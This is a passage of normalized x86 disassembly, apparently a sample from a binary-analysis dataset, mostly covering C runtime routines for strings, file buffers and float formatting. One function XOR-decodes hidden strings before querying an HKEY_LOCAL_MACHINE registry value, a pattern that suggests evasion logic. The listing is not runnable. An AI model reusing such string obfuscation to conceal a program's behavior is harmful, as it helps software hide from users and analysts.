lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_41419f
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_404ad7
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_41419f
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
movzx eax al
sub_409fc3
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_40a250
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409ff0
cmp esi 0x7ffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_40458d
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_40f940
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x8
jb r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ eax ]
sub_40a039
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_41334d
pop ecx
pop ebp
retn
sub_40a075
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41113d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
pop ecx
sub_40a0a0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ecx + 0x4 ] 0x0
mov [ ebp - 0x4 ] ecx
je r-xdata
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x8 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x8 ] edx
test esi esi
jle r-xdata
pop esi
push ebx
mov ebx [ ebp + 0x10 ]
push edi
xor eax eax
test edi edi
jle r-xdata
mov edi eax
add edx edi
mov [ ebp - 0x8 ] edx
cmp edx esi
jl r-xdata
mov esi [ ebp + 0x8 ]
sub esi ebx
add edx ebx
mov [ ebp - 0xc ] edx
mov edi [ ecx + 0x8 ]
mov eax esi
sub eax edx
cmp eax edi
jge r-xdata
pop edi
pop ebx
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x4 ]
add edx eax
mov bl [ esi + edx ]
xor bl [ eax + ecx ]
mov ecx [ ebp - 0x4 ]
inc eax
mov [ edx ] bl
cmp eax edi
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
sub_40a117
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_40a170
push ebp
mov ebp esp
push 0xffffffff
push sub_416195
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
push 0x34
call sub_4066cf
mov esi eax
xor eax eax
add esp 0x4
mov [ ebp - 0x14 ] esi
cmp esi eax
je r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] eax
call sub_40140f
push r--data
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x20 ] r--data
call sub_4037cf
int3
mov ecx [ edi + 0x4 ]
mov [ esi ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x4 ] edx
mov ecx [ edi + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x30 ] ax
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x1
cmp edi eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi ] al
push edx
or eax 0xffffffff
xor ebx ebx
mov ecx edi
call sub_406100
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ edi + 0x1c ] ecx
mov edx [ eax + 0x20 ]
mov [ edi + 0x20 ] edx
sub_40a250
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_4013e2
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_4068a2
jmp r-xdata
sub_40a285
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41113d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
pop ecx
sub_40a2a6
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_40a2d1
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_40a384
push 0x10
push r--data
call sub_413ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_414035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40bc2e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_40f84f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40ebf7
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a455
mov eax [ ebp - 0x1c ]
call sub_406d2b
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_40a460
push esi
mov esi eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push edi
push eax
mov ecx esi
call sub_411250
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x8 ]
mov edx [ esi + 0x4 ]
mov [ esi + 0x8 ] ecx
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ edx ] edx
mov esi [ esi + 0x4 ]
pop edi
mov [ esi + 0x8 ] esi
pop esi
retn
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ edx ] eax
mov esi [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
pop edi
mov [ esi + 0x8 ] ecx
pop esi
retn
mov edi edi
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_40a4e5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407c01
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40a540
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_408b16
add esp 0x4
sub_40a580
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ecx + 0x10 ]
cmp esi ebx
jae r-xdata
sub esi ebx
cmp eax esi
jae r-xdata
push r--data
call sub_40eab5
cmp edi ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_409ff0
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_408bc0
mov eax ebx
xor ecx ecx
call sub_408bc0
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ edi ]
xor edx edx
mov [ ebx + eax ] dx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
lea ebx [ esi + esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_415340
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_40a640
push ebp
mov ebp esp
push 0xffffffff
push sub_416090
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x0
call sub_40140f
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call sub_4037cf
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
call sub_4134f0
mov [ ebp + 0xc ] eax
mov eax r-xdata
retn
push ecx
call sub_4066cf
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_408b16
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
call sub_415340
add esp 0xc
sub_40a774
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_4037cf
int3
mov edx [ esi ]
push edx
call sub_408b16
add esp 0x4
sub_40a7b0
mov ecx [ eax ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
sub_40a7fb
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_40a830
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
lea eax [ ecx * 8 ]
push eax
call sub_4066cf
add esp 0x4
test eax eax
jne r-xdata
sub_40a890
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
push 0x0
push ecx
push edx
call [ SetFilePointer@IAT ]
pop ebp
retn
cmp [ eax ] edx
je r-xdata
cmp eax ecx
je r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x10 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ rw-data ]
cmp ecx edx
jl r-xdata
cmp ecx 0x1
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ rw-data ]
cmp edx ecx
jge r-xdata
mov [ eax + 0x4 ] ecx
mov eax ecx
pop esi
pop ebp
retn
mov [ eax + 0x4 ] edx
mov eax edx
pop esi
pop ebp
retn
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp ecx esi
jle r-xdata
mov [ eax + 0x4 ] esi
mov eax esi
pop esi
pop ebp
retn
sub ecx edx
mov edx [ eax + 0x4 ]
add edx ecx
test edx edx
jg r-xdata
mov esi [ eax + 0x4 ]
mov edx [ rw-data ]
add esi ecx
cmp esi edx
jge r-xdata
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
sub_40a940
push ebp
mov ebp esp
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff0
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x27
jb r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x68 ]
push edx
push 0x80000002
mov [ ebp - 0x1a ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
xor ecx ecx
cmp eax 0x2
setne cl
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8c
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x8
jb r-xdata
push esi
xor eax eax
lea ecx [ ebp - 0x74 ]
push ecx
lea edx [ ebp - 0x78 ]
push edx
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x74 ] 0x4
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x6c ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi 0x2
setne al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x78 ] eax
pop esi
setne al
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
sub_40aa70
push ebp
mov ebp esp
push 0xffffffff
push sub_4164d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_40458d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_402540
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edi [ esi + 0x4 ]
mov edx [ esi ]
push ecx
push edi
mov ecx eax
mov [ ebp - 0x14 ] eax
call sub_406030
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add esp 0x8
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ ebx * 8 ]
sub ecx ebx
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov edi [ esi + 0x4 ]
mov eax [ esi ]
call sub_40a540
mov edx [ esi ]
push edx
call sub_408b16
add esp 0x4
sub_40ab76
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_40f84f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40b0dc
pop ecx
mov [ esi ] eax
pop esi
sub_40abb0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_413f20
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40abdf
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_407759
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_40f84f
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_40f84f
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_40c515
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_4045bd
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_415c30
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_415d40
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_415d40
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_413e10
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_415d40
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_415c60
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_415c60
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_415c60
add al 0x30
mov [ esi ] al
